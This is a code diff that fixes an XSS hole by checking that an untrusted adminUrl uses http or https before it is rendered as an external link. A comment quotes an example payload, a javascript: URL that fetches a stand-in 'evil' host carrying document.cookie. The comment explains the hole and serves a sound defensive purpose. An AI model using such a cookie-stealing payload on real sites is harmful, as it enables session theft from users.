@@ -54,9 +54,38 @@ function formatRelativeTime(timestamp: string): string {
     return formatDistanceToNow(date, { addSuffix: true });
 }
 
+/**
+ * Security: `directory-site` entry `adminUrl` originates from the deployed
+ * directory site fetched by the pull-mode data-sync client (untrusted external
+ * content) and is rendered into an `<a href target="_blank">`. Without this an
+ * operator/attacker returning `javascript:fetch('//evil/?c='+document.cookie)`
+ * as `adminUrl` lands a working XSS — `rel="noopener noreferrer"` does not block
+ * it. Returns `undefined` for anything that isn't http/https (including
+ * non-string values, which throw in `new URL` and hit the catch). Mirrors
+ * `safeExternalUrl` in ComparisonDetailClient.tsx / ItemCard.tsx.
+ */
+function safeExternalUrl(raw: string | undefined | null): string | undefined {
+    if (!raw) return undefined;
+    try {
+        const parsed = new URL(raw);
+        if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
+            return undefined;
+        }
+        return parsed.toString();
+    } catch {
+        return undefined;
+    }
+}
+
 function entryHref(entry: FeedEntry, workId: string): { href: string; external: boolean } {
     if (entry.source === 'directory-site') {
-        return { href: entry.target.adminUrl, external: true };
+        // Security: only render the external link for validated http(s) URLs;
+        // an unsafe scheme falls through to an inert internal anchor (`#`).
+        const safeUrl = safeExternalUrl(entry.target.adminUrl);
+        if (safeUrl) {
+            return { href: safeUrl, external: true };
+        }
+        return { href: '#', external: false };
     }
     if (entry.source === 'generation-history') {
         return {
